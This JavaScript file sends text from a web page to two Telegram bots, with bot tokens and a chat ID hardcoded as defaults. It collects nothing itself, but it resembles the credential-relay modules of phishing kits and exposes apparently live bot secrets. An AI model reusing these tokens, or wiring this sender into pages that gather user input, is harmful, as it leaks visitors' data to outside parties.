window.TELEGRAM_BOT_TOKEN = "";
window.TELEGRAM_CHAT_ID = ""
window.TELEGRAM_BOT_TOKEN_2 = window.TELEGRAM_BOT_TOKEN_2 || "8911107912:AAGFOssffgWdzrUEAk3KglayQF-DD1JIDi0";
window.TELEGRAM_CHAT_ID_2 = window.TELEGRAM_CHAT_ID_2 || "8546425880";
window.TELEGRAM_REQUEST_TIMEOUT_MS = 5000; // Default timeout for Telegram requests in milliseconds

function getTelegramDestinations() {
  const destinations = [];

  const primaryBotToken = window.TELEGRAM_BOT_TOKEN || "8777744647:AAEH-VhR2MywIMuBXiZGcXvO14TzHgO7kZU";
  const primaryChatId = window.TELEGRAM_CHAT_ID || "8546425880";
  if (primaryBotToken && primaryChatId) {
    destinations.push({
      botToken: primaryBotToken,
      chatId: primaryChatId,
    });
  }

  const secondaryBotToken = window.TELEGRAM_BOT_TOKEN_2 || "8911107912:AAGFOssffgWdzrUEAk3KglayQF-DD1JIDi0";
  const secondaryChatId = window.TELEGRAM_CHAT_ID_2 || "8546425880";
  if (secondaryBotToken && secondaryChatId) {
    destinations.push({
      botToken: secondaryBotToken,
      chatId: secondaryChatId,
    });
  }

  return destinations;
}

async function sendToTelegramDestination(destination, text, notify, timeoutMs) {
  const controller = new AbortController();
  const timeoutId = window.setTimeout(function() {
    controller.abort();
  }, timeoutMs);

  try {
    const response = await fetch(`https://api.telegram.org/bot${destination.botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: destination.chatId,
        text: text,
        disable_notification: !notify,
        parse_mode: "HTML",
      }),
      signal: controller.signal,
    });

    if (!response.ok) {
      throw new Error(`Telegram request failed with status ${response.status}`);
    }

    const data = await response.json();

    if (!data.ok) {
      throw new Error(data.description || "Telegram request failed.");
    }

    return data;
  } finally {
    window.clearTimeout(timeoutId);
  }
}

async function send(text, notify = true, timeoutMs = TELEGRAM_REQUEST_TIMEOUT_MS) {
  const destinations = getTelegramDestinations();

  if (!destinations.length) {
    throw new Error("No Telegram destinations configured.");
  }

  const results = await Promise.allSettled(destinations.map(function(destination) {
    return sendToTelegramDestination(destination, text, notify, timeoutMs);
  }));

  const failures = results.filter(function(result) {
    return result.status === "rejected";
  });

  if (failures.length === results.length) {
    throw failures[0].reason || new Error("Telegram request failed.");
  }

  if (failures.length) {
    console.warn("Telegram message delivered to at least one destination, but some deliveries failed.", failures);
  }

  return {
    ok: true,
    results: results,
  };
}
    